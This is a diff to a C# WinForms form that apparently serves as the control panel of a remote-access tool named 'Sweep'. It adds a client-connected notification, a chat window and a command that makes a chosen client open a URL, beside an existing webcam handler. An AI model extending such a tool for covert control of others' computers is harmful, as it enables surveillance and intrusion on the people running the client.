@@ -1,15 +1,18 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Windows.Forms;
-using BrightIdeasSoftware;
+﻿using BrightIdeasSoftware;
 using LazyServer;
+using Microsoft.VisualBasic;
 using Newtonsoft.Json.Linq;
 using Sweep.Models;
 using Sweep.Services;    // MessageHandler
 using Sweep.UI;          // ListViewConfigurator
-using Microsoft.VisualBasic;
-using System.Threading.Tasks;
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.IO;
 using System.Security.Cryptography;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Sweep.Forms
 {
@@ -17,7 +20,9 @@ namespace Sweep.Forms
     {
         private readonly LazyServerHost _server;
         private readonly MessageHandler _dispatcher;
+        private Chat chat;
         private int logsnum = 0;
+        private Remembrance remembrance = new Remembrance();
 
         // Inject the already-started server here
         public Sweep(LazyServerHost server)
@@ -110,6 +115,22 @@ namespace Sweep.Forms
             logsnum = 0;
             counter.Visible = false;
         }
+        public void ShowClientConnectedNotification(string clientId)
+        {
+            Bitmap bitmap = global::Sweep.Properties.Resources.cleaning;
+            using (var stream = new MemoryStream())
+            {
+                Icon icon = Icon.FromHandle(bitmap.GetHicon());
+                icon.Save(stream);
+                if (notifyIcon1 != null)
+                {
+                    notifyIcon1.BalloonTipTitle = "New Client Connected";
+                    notifyIcon1.BalloonTipText = clientId;
+                    notifyIcon1.Icon = icon; // Use the created icon
+                    notifyIcon1.ShowBalloonTip(2000);
+                }
+            }
+        }
 
         private async void webcam_Click(object sender, EventArgs e)
         {
@@ -160,11 +181,26 @@ namespace Sweep.Forms
                 ClientConnection conn = _server.GetConnectionById(item.ID);
                 if (conn != null)
                 {
-                    var input = Interaction.InputBox("Enter display name", "Chat", Global.Name);
+                    var input = Interaction.InputBox("Enter UsrName", "Chat", Global.Name);
 
                     if (String.IsNullOrEmpty(input)) {
                         return;
                     }
+
+                    chat = new Chat();
+                    chat.username = input;
+                    chat.Show();
+
+                    chat.OnMessageSent += async (message, f) =>
+                    {
+                        Console.WriteLine($"Sending message: {message} to {conn.Id}");
+                        await _server.SendMessageToClient(conn.Id, new JObject
+                        {
+                            ["command"] = "chatmsg",
+                            ["username"] = input,
+                            ["text"] = message
+                        }.ToString());
+                    };
 
                     await _server.SendMessageToConnection(conn, new JObject
                     {
@@ -249,6 +285,35 @@ namespace Sweep.Forms
                 // Wait a random time between 3 to 10 seconds
                 int delayMs = rng.Next(500, 1000);
                 await Task.Delay(delayMs);
+            }
+        }
+
+        private async void openURLToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (var obj in listView1.SelectedObjects)
+            {
+                ClientInfo item = (ClientInfo)obj;
+                if (item == null) { return; }
+                ;
+
+                ClientConnection conn = _server.GetConnectionById(item.ID);
+                if (conn != null)
+                {
+                    var input = Interaction.InputBox("Enter URL (Must include http:// or https://)", "Url", remembrance.GetAttribute<string>("website") ?? "https://example.com");
+
+                    if (String.IsNullOrEmpty(input))
+                    {
+                        return;
+                    }
+
+                    remembrance.SetAttribute("website", input);
+
+                    await _server.SendMessageToConnection(conn, new JObject
+                    {
+                        ["command"] = "url",
+                        ["body"] = input,
+                    }.ToString());
+                }
             }
         }
 
